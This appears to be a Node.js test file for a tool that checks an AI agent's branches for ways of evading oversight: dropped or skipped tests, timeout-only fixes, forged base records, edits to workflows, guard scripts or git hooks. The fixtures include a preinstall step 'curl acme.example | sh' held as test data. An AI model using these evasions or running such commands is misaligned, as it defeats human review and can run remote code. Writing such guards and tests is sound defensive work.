// climb.mjs's tests, split from climb.test.mjs (2026-10-09) so they run in parallel.
// The synthetic Acme repo and the stubs are in tests/helpers/climb.mjs; nothing here reads the live world.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtemp, writeFile, readFile, rm, mkdir, cp, realpath, readdir } from 'node:fs/promises';
import { existsSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, resolve, dirname } from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';
import { run } from './helpers/run.mjs';
import { runBlocks } from './helpers/workflows.mjs';
import { NIGHT, git, write, commit, acme, climb, json, load, LEDGER_TEST, suite, ledgerRuns, WAITING } from './helpers/climb.mjs';

test('guard: fails when a test that ran in the base did not run in the candidate (dropped or skipped), and passes a refactor', async t => {
  const dir = await acme(t, { climb: { jobs: ['test-time'], testCommand: LEDGER_TEST }, config: { check: LEDGER_TEST }, files: { 'acme.test.mjs': suite('acme adds', 'acme subtracts') } });
  const base = git(dir, ['rev-parse', 'HEAD']);
  const at = async (branch, files) => { git(dir, ['checkout', '-q', '-b', branch, base]); return commit(dir, files, `acme: ${branch}`); };
  const guard = () => climb(dir, ['guard', '--base', base, '--json']);

  await at('drop', { 'acme.test.mjs': suite('acme adds') });
  const dropped = guard();
  assert.equal(dropped.status, 1, dropped.stdout);
  assert.deepEqual(json(dropped).missing, [{ file: 'acme.test.mjs', name: 'acme subtracts', how: 'dropped' }]);
  assert.match(json(dropped).problems[0], /^dropped: acme\.test\.mjs "acme subtracts" ran in the base [0-9a-f]{7}/);

  await at('skip', { 'acme.test.mjs': suite('acme adds', { text: "test('acme subtracts', { skip: true }, () => {});" }) });
  const skipped = guard();
  assert.equal(skipped.status, 1, skipped.stdout);
  assert.deepEqual(json(skipped).missing.map(m => m.how), ['skipped']);

  await at('refactor', { 'acme.test.mjs': `${suite('acme adds', 'acme subtracts')}// shared fixture\n` });
  const ok = guard();
  assert.equal(ok.status, 0, ok.stdout + ok.stderr);
  assert.match(json(ok).line, /exit 0 on [0-9a-f]{7}; 2 tests ran, none dropped or skipped against the base/);
  // PR #59: the gate is the agent's code, run after the guard's checks. One that runs the suite, then
  // commits (or only stages) a change and exits 0, is refused: only the commit checked is ever taken.
  const checked = git(dir, ['rev-parse', 'HEAD']);
  const cfg = JSON.parse(await readFile(join(dir, '.keel/keel.json'), 'utf8'));
  for (const [tail, said] of [
    ['echo "// sneak" >> acme.test.mjs && git add acme.test.mjs && git commit -q -m sneak', /moved HEAD from [0-9a-f]{7} to [0-9a-f]{7} after the guard's checks/],
    ['echo "// sneak" >> acme.test.mjs && git add acme.test.mjs', /changed the tracked tree or the index after the guard's checks/],
    // PR #59: a config set (here core.hooksPath) in the git dir is refused before any git of keel's reads it.
    ['git config core.hooksPath acme-hooks', /changed the git dir's config, hooks or attributes/],
  ]) {
    await writeFile(join(dir, '.keel/keel.json'), JSON.stringify({ ...cfg, check: `${LEDGER_TEST} && ${tail}` }));
    const moved = guard();
    assert.equal(moved.status, 1, moved.stdout + moved.stderr);
    assert.ok(json(moved).problems.some(p => said.test(p)), JSON.stringify(json(moved).problems));
    git(dir, ['reset', '-q', '--hard', checked]);
  }

  await at('red', { 'acme.test.mjs': suite('acme adds', { text: "test('acme subtracts', () => { throw new Error('acme'); });" }) });
  const red = guard();
  assert.equal(red.status, 1);
  assert.match(json(red).problems[0], /the gate `.*` failed \(exit 1\)/);

  // No ledger: guard cannot tell, and says so (exit 2), never a pass.
  // (The config is the project's, never the branch's: .keel/keel.json is off limits to a night's commits.)
  git(dir, ['checkout', '-q', '-f', 'refactor']);
  await commit(dir, { 'acme.test.mjs': `${suite('acme adds', 'acme subtracts')}// shared fixture, again\n` }, 'acme: no ledger');
  await writeFile(join(dir, '.keel/keel.json'), JSON.stringify({ name: 'Acme', check: 'node --test acme.test.mjs', climb: { jobs: ['test-time'], testCommand: 'node --test acme.test.mjs' } }));
  const blind = climb(dir, ['guard', '--base', base, '--json']);
  assert.equal(blind.status, 2);
  assert.match(json(blind).error, /recorded no test ledger run/);
});

test('sandbox: the agent\'s commits may not change a workflow, keel\'s scripts or .keel/keel.json; climb.mjs sandbox and both guards refuse them before anything runs', async t => {
  // A gate that would leave a mark if it ran: a refused branch never reaches it.
  const dir = await acme(t, { config: { check: 'node -e "require(\'fs\').writeFileSync(\'gate-ran\', \'\')"' }, files: { 'acme.mjs': 'export const anvil = 1;\n' } });
  const base = git(dir, ['rev-parse', 'HEAD']);
  const at = async (branch, files) => { git(dir, ['checkout', '-q', '-b', branch, base]); return commit(dir, files, `acme: ${branch}`); };
  for (const [branch, path] of [['workflow', '.github/workflows/acme.yml'], ['script', 'scripts/keel/acme.mjs'], ['config', '.keel/keel.json']]) {
    const head = await at(branch, { [path]: path === '.keel/keel.json' ? '{"name":"Acme","climb":{"jobs":["test-time"]},"check":"true"}\n' : '// acme\n' });
    const sb = climb(dir, ['sandbox', '--base', base, '--head', head, '--json']);
    assert.equal(sb.status, 1, `${path}: ${sb.stdout}`);
    assert.equal(json(sb).ok, false);
    assert.match(json(sb).problems[0], new RegExp(`^${path.replace(/\./g, '\\.')}: changed on the agent's branch`));
    for (const args of [['guard', '--base', base, '--json'], ['guard', '--job', 'tend', '--base', base, '--json']]) {
      const g = climb(dir, args);
      assert.equal(g.status, 1, `${args.join(' ')} on ${path}: ${g.stdout}${g.stderr}`);
      assert.match(json(g).problems[0], /changed on the agent's branch/);
    }
    assert.equal(existsSync(join(dir, 'gate-ran')), false, `${path}: the gate never ran`);
    git(dir, ['checkout', '-q', '-f', 'main']);
  }
  // Anything else passes the sandbox; a head not on top of the base does not.
  const fine = await at('fine', { 'acme.mjs': 'export const anvil = 2;\n', 'docs/acme.md': '# Acme\n' });
  const ok = climb(dir, ['sandbox', '--base', base, '--head', fine, '--json']);
  assert.equal(ok.status, 0, ok.stdout);
  assert.deepEqual(json(ok), { ok: true, offLimits: ['.github/', 'scripts/keel/', '.keel/keel.json', '.keel/agent-git/'], problems: [] });
  const off = climb(dir, ['sandbox', '--base', fine, '--head', base, '--json']);
  assert.equal(off.status, 1);
  assert.match(json(off).problems[0], /is not on top of the base/);
  assert.equal(climb(dir, ['sandbox', '--base', base, '--json']).status, 2, 'sandbox needs both refs');
});

test('hygiene guard: refuses a diff that only raises a timeout or wraps a retry around the flaky test, naming the line; a real fix that also changes a timeout passes, with a note', async t => {
  const dir = await acme(t, { climb: { jobs: ['hygiene'], testCommand: LEDGER_TEST }, config: { check: LEDGER_TEST }, files: { 'acme.test.mjs': WAITING } });
  const base = git(dir, ['rev-parse', 'HEAD']);
  await ledgerRuns(dir, { commit: base, tree: git(dir, ['rev-parse', 'HEAD^{tree}']), outcomes: ['pass', 'fail', 'pass'] });
  const baseline = json(climb(dir, ['measure', 'hygiene', '--baseline', '--json']));
  assert.equal(baseline.median, 1);
  assert.deepEqual(baseline.flaky.map(f => [f.file, f.name, f.passed, f.failed]), [['acme.test.mjs', 'acme waits', 2, 1]]);
  assert.match(baseline.flaky[0].alone, /^node --test --test-name-pattern='\^acme waits\$' acme\.test\.mjs$/);
  const at = async (branch, text) => { git(dir, ['checkout', '-q', '-b', branch, base]); return commit(dir, { 'acme.test.mjs': text }, `acme: ${branch}`); };
  const guard = () => climb(dir, ['guard', '--json']);

  // A longer timeout and nothing else: refused, naming the line. (Mutation: removing the refusal fails here.)
  await at('longer', WAITING.replace('{ timeout: 100 }', '{ timeout: 5000 }'));
  const longer = guard();
  assert.equal(longer.status, 1, longer.stdout + longer.stderr);
  assert.match(json(longer).problems[0], /^acme\.test\.mjs:3 `test\('acme waits', \{ timeout: 5000 \}, async \(\) => \{`: in the flaky test's file this diff only changes a timeout or a retry/);
  assert.equal(json(longer).refused[0].line, 3);

  // A retry wrapped around the body (its lines re-indented): still only a retry.
  await at('retry', WAITING.replace("  const id = Math.random().toString(36).slice(2, 6);\n  if (id.length > 4) throw new Error('acme');\n",
    "  for (let attempt = 0; attempt < 3; attempt++) {\n    try {\n      const id = Math.random().toString(36).slice(2, 6);\n      if (id.length > 4) throw new Error('acme');\n      break;\n    } catch {}\n  }\n"));
  const retry = guard();
  assert.equal(retry.status, 1, retry.stdout);
  assert.match(json(retry).problems[0], /^acme\.test\.mjs:4 `for \(let attempt = 0; attempt < 3; attempt\+\+\) \{`: .*only changes a timeout or a retry/);

  // The cause fixed, and the timeout changed too: it passes, and says so for the person.
  await at('fixed', WAITING.replace('{ timeout: 100 }', '{ timeout: 500 }').replace('.slice(2, 6)', '.slice(2, 6).padEnd(4, "0").slice(0, 4)'));
  const fixed = guard();
  assert.equal(fixed.status, 0, fixed.stdout + fixed.stderr);
  assert.match(json(fixed).noted[0].message, /^acme\.test\.mjs:3 .*changes a timeout or a retry beside 2 other changed lines: a real fix that also changes a timeout passes/);
  assert.match(fixed.stdout, /"line": "`node --test/);
  assert.deepEqual(JSON.parse(await readFile(join(dir, '.keel/climb/night.json'), 'utf8')).hygieneNotes.length, 1);
  // The same check by name, against an explicit base.
  assert.equal(climb(dir, ['guard', '--job', 'hygiene', '--base', base, '--json']).status, 0);
});

test('build guard: fails when the build output changes and no harmless reason names the path; passes byte-identical, or explained, and the PR names each reason', async t => {
  const build = text => `import { mkdirSync, writeFileSync } from 'node:fs';\nmkdirSync('dist/css', { recursive: true });\nwriteFileSync('dist/app.txt', ${JSON.stringify(text)});\nwriteFileSync('dist/css/acme.css', 'body{}\\n');\n`;
  const cfg = { jobs: ['build-time'], build: 'node build.mjs', buildOutput: 'dist/', testCommand: LEDGER_TEST };
  const dir = await acme(t, { climb: cfg, config: { check: LEDGER_TEST }, files: { 'build.mjs': build('acme anvils\n'), '.gitignore': 'dist/\n', 'acme.test.mjs': suite('acme adds') } });
  const base = git(dir, ['rev-parse', 'HEAD']);
  const m = await load(dir);
  json(climb(dir, ['measure', 'build-time', '--baseline', '--runs', '1', '--json']));
  const at = async (branch, text) => { git(dir, ['checkout', '-q', '-b', branch, base]); return commit(dir, { 'build.mjs': text }, `acme: ${branch}`); };

  await at('same', `// one pass, not two\n${build('acme anvils\n')}`);
  const same = climb(dir, ['guard', '--json']);
  assert.equal(same.status, 0, same.stdout + same.stderr);
  assert.deepEqual([json(same).build.output, json(same).build.files, json(same).build.changes], ['dist', 2, []]);

  // #82: the build is the agent's code, run in a worktree that shares the git dir: a config it writes to the common
  // git dir is refused before any git of keel's runs again.
  const plant = `import { readFileSync, appendFileSync } from 'node:fs';\nimport { resolve } from 'node:path';\nconst gd = readFileSync('.git', 'utf8').trim().replace('gitdir: ', '');\nappendFileSync(resolve(resolve(gd, readFileSync(resolve(gd, 'commondir'), 'utf8').trim()), 'config'), '[acme]\\n\\tplanted = yes\\n');\n${build('acme anvils\n')}`;
  await at('plant', plant);
  const planted = climb(dir, ['guard', '--json']);
  assert.equal(planted.status, 1, planted.stdout + planted.stderr);
  assert.match(json(planted).problems.join('\n'), /^the build `node build\.mjs` changed the git dir's config, hooks or attributes/);
  git(dir, ['config', '--unset', 'acme.planted']);

  // The output changed and nothing says why: the guard fails, naming the path. (Mutation: accepting it fails here.)
  await at('changed', build('acme anvils, faster\n'));
  const changed = climb(dir, ['guard', '--json']);
  assert.equal(changed.status, 1, changed.stdout + changed.stderr);
  assert.deepEqual(json(changed).build.changes, [{ path: 'dist/app.txt', how: 'changed' }]);
  assert.match(json(changed).problems[0], /^build output changed: dist\/app\.txt differs from the base [0-9a-f]{7}'s and has no harmless reason \(climb\.mjs harmless --path dist\/app\.txt/);
  // A reason for another path is not a reason for this one.
  climb(dir, ['harmless', '--path', 'dist/css/acme.css', '--why', 'acme']);
  assert.equal(climb(dir, ['guard', '--json']).status, 1);
  const h = climb(dir, ['harmless', '--path', 'dist/app.txt', '--why', 'the banner text only; no code changes', '--json']);
  assert.equal(h.status, 0, h.stderr);
  const explained = climb(dir, ['guard', '--json']);
  assert.equal(explained.status, 0, explained.stdout + explained.stderr);
  const night = JSON.parse(await readFile(join(dir, '.keel/climb/night.json'), 'utf8'));
  assert.deepEqual(night.build.changes, [{ path: 'dist/app.txt', how: 'changed', why: 'the banner text only; no code changes' }]);

  // The PR names it under Merge danger, for the person to judge.
  const { prBody } = await import(pathToFileURL(join(NIGHT, 'pr-body.mjs')).href);
  const kept = { what: 'acme: one pass', verdict: 'keep', why: 'beat', candidate: 'a'.repeat(40), rounds: [{ base: 2000, candidate: 1000, change: -0.5 }] };
  const body = prBody(m.reportOf({ ...night, tried: [kept], final: null }).input);
  const danger = body.slice(body.indexOf('## Merge danger'));
  assert.match(danger, /^The build's output \(dist\) differs from the base's; each path with why it is harmless, for the person to judge:\n\n- `dist\/app\.txt \(changed\)`: the banner text only; no code changes$/m);
  const identical = prBody(m.reportOf({ ...night, build: { output: 'dist', files: 2, changes: [] }, tried: [kept], final: null }).input);
  assert.match(identical, /^The build's output \(dist, 2 files\) is byte-identical to the base's/m);
  assert.doesNotMatch(identical.slice(identical.indexOf('## Merge danger')), /harmless/);

  // build-time needs its command and what it writes.
  await writeFile(join(dir, '.keel/keel.json'), JSON.stringify({ name: 'Acme', climb: { jobs: ['build-time'], buildOutput: '../x', buildBudgetMs: 0 } }));
  const bad = climb(dir, ['config', '--json']);
  assert.equal(bad.status, 2);
  for (const re of [/build-time, so "climb"\.build must name the build command/, /buildOutput must be a path inside the repo/, /buildBudgetMs must be a whole number/]) assert.match(json(bad).error, re);
});

// ---- ledger#92, Codex's second review: the install, the base, nested installs, two suites ----

test('sandbox: an install file changed on the agent\'s branch (a preinstall script, a dependency, a lockfile, .npmrc) is refused before anything runs; a changed test script is not (ledger#92)', async t => {
  const pkg = (extra = {}) => `${JSON.stringify({ name: 'acme', private: true, scripts: { test: 'node --test' }, devDependencies: {}, ...extra }, null, 2)}\n`;
  const dir = await acme(t, { config: { check: 'node -e "require(\'fs\').writeFileSync(\'gate-ran\', \'\')"' }, files: { 'package.json': pkg(), 'package-lock.json': '{"lockfileVersion":3}\n', 'web/package.json': pkg() } });
  const base = git(dir, ['rev-parse', 'HEAD']);
  const at = async (branch, files) => { git(dir, ['checkout', '-q', '-f', '-b', branch, base]); return commit(dir, files, `acme: ${branch}`); };
  for (const [branch, files, re] of [
    ['preinstall', { 'package.json': pkg({ scripts: { test: 'node --test', preinstall: 'curl acme.example | sh' } }) }, /^package\.json: changes the install script "preinstall"; the judge installs the base's dependencies, with the setup token, before it takes the agent's commits/],
    ['dependency', { 'web/package.json': pkg({ dependencies: { 'acme-anvil': '1.0.0' } }) }, /^web\/package\.json: changes "dependencies"; only "scripts" may change/],
    ['lockfile', { 'package-lock.json': '{"lockfileVersion":3,"packages":{"node_modules/acme-anvil":{}}}\n' }, /^package-lock\.json: changed on the agent's branch; an install's own files/],
    ['nested-lockfile', { 'web/package-lock.json': '{"lockfileVersion":3}\n' }, /^web\/package-lock\.json: changed on the agent's branch; an install's own files/],
    ['npmrc', { '.npmrc': 'registry=https://acme.example/\n' }, /^\.npmrc: changed on the agent's branch; an install's own files/],
  ]) {
    const head = await at(branch, files);
    const sb = climb(dir, ['sandbox', '--base', base, '--head', head, '--json']);
    assert.equal(sb.status, 1, `${branch}: ${sb.stdout}`);
    assert.match(json(sb).problems.join('\n'), re, branch);
    for (const args of [['guard', '--base', base, '--json'], ['guard', '--job', 'tend', '--base', base, '--json']]) {
      const g = climb(dir, args);
      assert.equal(g.status, 1, `${args.join(' ')} on ${branch}: ${g.stdout}${g.stderr}`);
      assert.match(json(g).problems.join('\n'), re);
    }
    assert.equal(existsSync(join(dir, 'gate-ran')), false, `${branch}: the gate never ran`);
  }
  // A climb night may change the command it times: "scripts" but the install's own.
  const faster = await at('faster', { 'package.json': pkg({ scripts: { test: 'node --test --test-concurrency=4' } }) });
  const ok = climb(dir, ['sandbox', '--base', base, '--head', faster, '--json']);
  assert.equal(ok.status, 0, ok.stdout);
});

// PR #59: git quotes a path with a non-ASCII byte, a quote or a control character (core.quotePath), so
// "scripts/keel/é.mjs" read from --name-status without -z is "\"scripts/keel/\303\251.mjs\"", which starts
// with no off-limits prefix and has no install file's name. Every path list is read NUL-delimited.
test('sandbox: a path git quotes (a non-ASCII byte, a quote) is read as it is: a keel script, a lockfile and a package.json\'s new dependency and install script are refused, by sandboxProblems and the command line', async t => {
  const pkg = (extra = {}) => `${JSON.stringify({ name: 'acme-é', private: true, scripts: { test: 'node --test' }, ...extra }, null, 2)}\n`;
  const dir = await acme(t, { files: { 'acme.mjs': 'export const anvil = 1;\n', 'pkg/é/package.json': pkg() } });
  const base = git(dir, ['rev-parse', 'HEAD']);
  const tend = await import(pathToFileURL(join(dir, 'scripts/keel/tend.mjs')).href);
  for (const [file, text, said] of [
    ['scripts/keel/é.mjs', '// acme\n', /^scripts\/keel\/é\.mjs: changed on the agent's branch; .* are off limits to it/],
    ['scripts/keel/a"b.mjs', '// acme\n', /^scripts\/keel\/a"b\.mjs: changed on the agent's branch; .* are off limits to it/],
    ['pkg/é/package-lock.json', '{"lockfileVersion":3}\n', /^pkg\/é\/package-lock\.json: changed on the agent's branch; an install's own files/],
    ['pkg/é/package.json', pkg({ dependencies: { 'acme-anvil': '1.0.0' }, scripts: { test: 'node --test', postinstall: 'node acme.mjs' } }), /^pkg\/é\/package\.json: changes "dependencies"; only "scripts" may change/],
  ]) {
    git(dir, ['checkout', '-q', '-f', '-B', 'quoted', base]);
    const head = await commit(dir, { [file]: text }, 'acme: quoted');
    assert.match(run('git', ['diff', '--name-only', base, head], { cwd: dir }).stdout, /^"/, `${file}: git quotes it`);
    const problems = tend.sandboxProblems(dir, base, head);
    assert.ok(problems.some(p => said.test(p)), `${file}: ${JSON.stringify(problems)}`);
    const sb = climb(dir, ['sandbox', '--base', base, '--head', head, '--json']);
    assert.equal(sb.status, 1, `${file}: ${sb.stdout}${sb.stderr}`);
    assert.match(json(sb).problems.join('\n'), said, file);
  }
});

test('a forged base: the judge passes the run\'s commit, and a pass or night record naming another base is refused; the commits before it never escape the guard (ledger#92)', async t => {
  // tend: an evidence edit, then a cited fix; the agent's record names the fix's parent as its base.
  const dir = await acme(t, { climb: { jobs: ['test-time'], testCommand: 'node t.mjs' }, config: { check: 'true' }, files: { 't.mjs': '\n', 'docs/evidence/01-acme.md': '# checked\n', 'docs/acme.md': '# Acme\n' } });
  const base = git(dir, ['rev-parse', 'HEAD']);
  git(dir, ['checkout', '-q', '-b', 'keel-tend/2026-10-12']);
  const hidden = await commit(dir, { 'docs/evidence/01-acme.md': '# checked, and lived-in\n' }, 'acme: evidence\n\nTend: drift:1');
  await commit(dir, { 'docs/acme.md': '# Acme, fixed\n' }, 'acme: a fix\n\nTend: drift:1');
  const pass = forged => write(dir, { '.keel/tend/.gitignore': '*\n', '.keel/tend/pass.json': JSON.stringify({ date: '2026-10-12', base: forged, worksheet: { findings: [{ id: 'drift:1' }] }, notes: [] }) });
  await pass(hidden);
  const g = climb(dir, ['guard', '--job', 'tend', '--base', base, '--json']);
  assert.equal(g.status, 1, g.stdout + g.stderr);
  assert.match(json(g).problems[0], new RegExp(`^\\.keel/tend/pass\\.json names its base ${hidden.slice(0, 12)}, not the run's commit ${base.slice(0, 7)} \\(--base\\)`));
  const rep = climb(dir, ['tend-report', '--base', base, '--json']);
  assert.equal(rep.status, 2, rep.stdout);
  assert.match(json(rep).error, /pass\.json names its base/);
  // The record naming the run's commit: the evidence edit is guarded, and refused.
  await pass(base);
  const honest = climb(dir, ['guard', '--job', 'tend', '--base', base, '--json']);
  assert.equal(honest.status, 1);
  assert.match(json(honest).problems.join('\n'), /^docs\/evidence\/01-acme\.md:1: edits evidence/m);

  // climb: the night's record names a commit past the run's.
  git(dir, ['checkout', '-q', '-f', '-b', 'keel-climb/test-time/2026-10-12', base]);
  json(climb(dir, ['measure', 'test-time', '--baseline', '--runs', '1', '--json']));
  const first = await commit(dir, { 't.mjs': '// first\n' }, 'acme: first');
  await commit(dir, { 't.mjs': '// second\n' }, 'acme: second');
  const nightFile = join(dir, '.keel/climb/night.json');
  const night = JSON.parse(await readFile(nightFile, 'utf8'));
  assert.equal(night.base, base);
  await writeFile(nightFile, JSON.stringify({ ...night, base: first }));
  const cg = climb(dir, ['guard', '--base', base, '--json']);
  assert.equal(cg.status, 1, cg.stdout + cg.stderr);
  assert.match(json(cg).problems[0], new RegExp(`^\\.keel/climb/night\\.json names its base ${first.slice(0, 12)}, not the run's commit ${base.slice(0, 7)}`));
  for (const args of [['settle', '--base', base], ['compare', '--final', '--base', base, '--runs', '1'], ['report', '--base', base]]) {
    const r = climb(dir, [...args, '--json']);
    assert.equal(r.status, 2, `${args[0]}: ${r.stdout}`);
    assert.match(json(r).error, /night\.json names its base/, args[0]);
  }
  assert.equal(git(dir, ['rev-list', '--count', `${base}..HEAD`]), '2', 'settle reset nothing on a forged record');
  // The record naming the run's commit: settle goes ahead.
  await writeFile(nightFile, JSON.stringify(night));
  assert.equal(climb(dir, ['settle', '--base', base, '--json']).status, 0);
});

test('worktrees share every install the tree has: the root\'s and each app or workspace folder\'s own node_modules, so a nested build runs on both sides (ledger#92)', async t => {
  const cfg = { jobs: ['build-time'], build: 'node web/build.mjs', buildOutput: 'dist/' };
  const build = tag => `// ${tag}\nimport { anvil } from 'acme-anvil';\nimport { mkdirSync, writeFileSync } from 'node:fs';\nmkdirSync('dist', { recursive: true });\nwriteFileSync('dist/app.txt', anvil);\n`;
  const dep = { 'package.json': '{"name":"acme-anvil","type":"module","exports":"./index.js"}\n', 'index.js': "export const anvil = 'acme anvils\\n';\n" };
  const dir = await acme(t, { climb: cfg, files: {
    '.gitignore': 'node_modules/\ndist/\n',
    'package.json': JSON.stringify({ name: 'acme', private: true, workspaces: ['packages/*'] }),
    'web/package.json': '{"name":"acme-web","private":true,"type":"module"}\n', 'web/build.mjs': build('base'),
    'packages/ui/package.json': '{"name":"acme-ui","private":true}\n',
    ...Object.fromEntries(Object.entries(dep).map(([p, s]) => [`web/node_modules/acme-anvil/${p}`, s])),
    ...Object.fromEntries(Object.entries(dep).map(([p, s]) => [`packages/ui/node_modules/acme-anvil/${p}`, s])),
    'node_modules/acme-root/package.json': '{"name":"acme-root"}\n',
  } });
  assert.equal(existsSync(join(dir, 'web/node_modules/acme-anvil/index.js')), true);
  assert.equal(git(dir, ['ls-files', 'web/node_modules']), '', 'the nested install is not tracked');
  const base = git(dir, ['rev-parse', 'HEAD']);
  const head = await commit(dir, { 'web/build.mjs': build('one pass') }, 'acme: one pass');
  const m = await load(dir);
  assert.deepEqual((await m.packageDirs(dir)).sort(), ['packages/ui', 'web']);
  const config = JSON.parse(await readFile(join(dir, '.keel/keel.json'), 'utf8'));
  // Mutation: linking the root's node_modules alone fails here (`acme-anvil` not found in web/).
  const built = await m.buildChanges(dir, { config, base, candidate: head });
  assert.deepEqual([built.files, built.changes], [1, []]);
});

test('guard: a gate that records a run per suite (the root\'s, then web\'s) is compared whole, every suite of each commit; the newest alone would be one suite (ledger#92)', async t => {
  const reporter = dest => `--test-reporter=spec --test-reporter-destination=stdout --test-reporter=${dest}scripts/keel/test-ledger.mjs --test-reporter-destination=stdout`;
  const TWO = `node --test ${reporter('./')} acme.test.mjs && cd web && node --test ${reporter('../')} web.test.mjs`;
  const dir = await acme(t, { climb: { jobs: ['test-time'], testCommand: TWO }, config: { check: TWO }, files: { 'acme.test.mjs': suite('acme adds', 'acme subtracts'), 'web/web.test.mjs': suite('acme renders') } });
  const base = git(dir, ['rev-parse', 'HEAD']);
  const at = async (branch, files) => { git(dir, ['checkout', '-q', '-f', '-b', branch, base]); return commit(dir, files, `acme: ${branch}`); };

  await at('refactor', { 'acme.test.mjs': `${suite('acme adds', 'acme subtracts')}// shared fixture\n` });
  const ok = climb(dir, ['guard', '--base', base, '--json']);
  assert.equal(ok.status, 0, ok.stdout + ok.stderr);
  assert.match(json(ok).line, /; 3 tests ran, none dropped or skipped against the base/);
  const runs = (await import(pathToFileURL(join(dir, 'scripts/keel/test-ledger.mjs')).href)).readRuns;
  const head = git(dir, ['rev-parse', 'HEAD']);
  assert.deepEqual((await runs(dir)).runs.filter(r => r.commit === head).map(r => r.dir).sort(), ['.', 'web'], 'two lanes on one commit');

  // The root suite drops a test; web's runs last. (Mutation: the newest record alone sees web's suite only, and passes.)
  await at('drop', { 'acme.test.mjs': suite('acme adds') });
  const dropped = climb(dir, ['guard', '--base', base, '--json']);
  assert.equal(dropped.status, 1, dropped.stdout + dropped.stderr);
  assert.deepEqual(json(dropped).missing, [{ file: 'acme.test.mjs', name: 'acme subtracts', how: 'dropped' }]);
  // Pure: a test counts as run when any record of the commit ran it.
  const m = await load(dir);
  const r = m.ranOn([{ commit: 'c', tests: [{ file: 'a', name: 'x', outcome: 'skip' }] }, { commit: 'c', tests: [{ file: 'a', name: 'x', outcome: 'pass' }, { file: 'web/b', name: 'y', outcome: 'pass' }] }, { commit: 'd', tests: [{ file: 'z', name: 'z', outcome: 'pass' }] }], 'c');
  assert.deepEqual(r.tests.map(x => [x.file, x.outcome]), [['a', 'pass'], ['web/b', 'pass']]);
  assert.equal(m.ranOn([], 'c'), null);
});

test('guard: only the records its own gate run wrote count; a suite the candidate dropped from its gate is not masked by a record the agent left at that commit (ledger#94)', async t => {
  const reporter = dest => `--test-reporter=spec --test-reporter-destination=stdout --test-reporter=${dest}scripts/keel/test-ledger.mjs --test-reporter-destination=stdout`;
  const ROOT = `node --test ${reporter('./')} acme.test.mjs`, WEB = `cd web && node --test ${reporter('../')} web.test.mjs`;
  // The gate is the project's own script (as ledger's `npm run check`): a branch may change what it runs.
  const gateFile = suites => `const { execSync } = require('node:child_process');\n${suites.map(c => `execSync(${JSON.stringify(c)}, { stdio: 'inherit' });`).join('\n')}\n`;
  const dir = await acme(t, { climb: { jobs: ['test-time'], testCommand: 'node gate.cjs' }, config: { check: 'node gate.cjs' }, files: { 'gate.cjs': gateFile([ROOT, WEB]), 'acme.test.mjs': suite('acme adds'), 'web/web.test.mjs': suite('acme renders') } });
  const base = git(dir, ['rev-parse', 'HEAD']);
  // A ledger record of the base the agent's job handed back, naming a test the base never ran: not read.
  await ledgerRuns(dir, { commit: base, tree: git(dir, ['rev-parse', 'HEAD^{tree}']), outcomes: ['pass'], file: 'acme.test.mjs', name: 'acme forged', others: [] });
  git(dir, ['checkout', '-q', '-b', 'narrow']);
  const head = await commit(dir, { 'gate.cjs': gateFile([ROOT]) }, 'acme: a faster gate');
  // The agent tests the web suite directly at the candidate, as the protocol tells it to test what it touched.
  assert.equal(run('sh', ['-c', WEB], { cwd: dir }).status, 0);
  const runs = (await import(pathToFileURL(join(dir, 'scripts/keel/test-ledger.mjs')).href)).readRuns;
  assert.ok((await runs(dir)).runs.some(r => r.commit === head && r.tests.some(x => x.name === 'acme renders')), 'a record at the candidate holds web\'s test');
  // Mutation: counting every record at the candidate SHA passes here.
  const g = climb(dir, ['guard', '--base', base, '--json']);
  assert.equal(g.status, 1, g.stdout + g.stderr);
  assert.deepEqual(json(g).missing, [{ file: 'web/web.test.mjs', name: 'acme renders', how: 'dropped' }]);
  assert.doesNotMatch(g.stdout, /acme forged/, 'the base is its own gate run, never a handed-back record');
});

test('worktrees go beside the checkout, so a sibling the setup cloned (ledger\'s ../ledger-data) resolves for the base\'s gate as for the candidate\'s; none is left behind, even on a failure (ledger#95)', async t => {
  const made = await acme(t, { climb: { jobs: ['test-time'], testCommand: LEDGER_TEST }, files: { 'acme.test.mjs': suite('acme adds') } });
  // Acme's data, as its setup clones it: a sibling of the checkout.
  const parent = await mkdtemp(join(tmpdir(), 'keel-climb-sibling-'));
  t.after(() => rm(parent, { recursive: true, force: true }));
  const dir = join(parent, 'acme');
  await cp(made, dir, { recursive: true });
  await write(parent, { 'acme-data/x': 'anvils\n' });
  const GATE = `node -e "require('fs').readFileSync('../acme-data/x')" && ${LEDGER_TEST}`;
  await writeFile(join(dir, '.keel/keel.json'), `${JSON.stringify({ name: 'Acme', climb: { jobs: ['test-time'], testCommand: LEDGER_TEST, build: GATE.replace(LEDGER_TEST, 'node -e "require(\'fs\').mkdirSync(\'dist\',{recursive:true});require(\'fs\').writeFileSync(\'dist/a\',\'a\')"'), buildOutput: 'dist/' }, check: GATE }, null, 2)}\n`);
  git(dir, ['commit', '-q', '-am', 'acme: the gate reads its data']);
  const base = git(dir, ['rev-parse', 'HEAD']);
  await commit(dir, { 'acme.test.mjs': `${suite('acme adds')}// shared fixture\n` }, 'acme: a refactor');
  const leftovers = async () => (await readdir(parent)).filter(n => n.startsWith('.keel-climb-'));
  // Mutation: worktrees under the OS temp (no ../acme-data there) fail the base's gate, and the guard with it.
  const g = climb(dir, ['guard', '--base', base, '--json']);
  assert.equal(g.status, 0, g.stdout + g.stderr);
  assert.match(json(g).line, /; 1 tests ran, none dropped or skipped against the base/);
  assert.deepEqual(await leftovers(), []);
  const m = await load(dir);
  const config = JSON.parse(await readFile(join(dir, '.keel/keel.json'), 'utf8'));
  assert.deepEqual((await m.buildChanges(dir, { config, base, candidate: 'HEAD' })).changes, []);
  // A build that fails: the error, and still nothing left beside the checkout.
  await assert.rejects(m.buildChanges(dir, { config: { ...config, climb: { ...config.climb, build: 'node -e "process.exit(3)"' } }, base, candidate: 'HEAD' }), /failed on the base/);
  assert.deepEqual(await leftovers(), []);
  assert.equal(git(dir, ['worktree', 'list']).split('\n').length, 1, 'no worktree registered');
});

// PR #59: a climb night may change the scripts that run the gate (the test command is often the change that
// pays), but then those scripts wrote the ledger records the guard compared; the gate line says so.
test('guard: a branch that changed the gate\'s scripts passes, and its gate line says the branch\'s own scripts wrote the records compared; one that did not says nothing of it', async t => {
  const pkg = check => `${JSON.stringify({ name: 'acme', private: true, scripts: { check } }, null, 2)}\n`;
